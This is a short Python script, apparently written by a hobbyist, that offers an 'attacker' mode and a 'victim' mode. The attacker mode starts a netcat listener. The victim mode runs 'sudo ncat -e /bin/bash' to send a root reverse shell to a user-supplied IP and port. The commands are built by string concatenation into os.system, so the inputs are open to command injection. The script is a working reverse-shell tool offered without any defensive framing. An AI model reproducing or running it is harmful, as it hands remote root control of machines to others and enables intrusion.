import os 
print("apt-get install ncat to install ")
cho = input("for attacker enter 1 for vicitm enter 2 : \n")
if cho =="1":
    print("you are now an attacker")
    port = input("enter port: \n")
    ip = input("enter your ip: \n")
    
    os.system("sudo nc -lnvp "+port+" -s "+ip+"")

if cho =="2":
    print("you are now the victim ")
    ips = input("ip: \n")
    ports = input("port:  \n")
    os.system("sudo ncat -e /bin/bash "+ips+" "+ports+"")
else:
    print("sorry i couldnot understand the choice pleas try again")



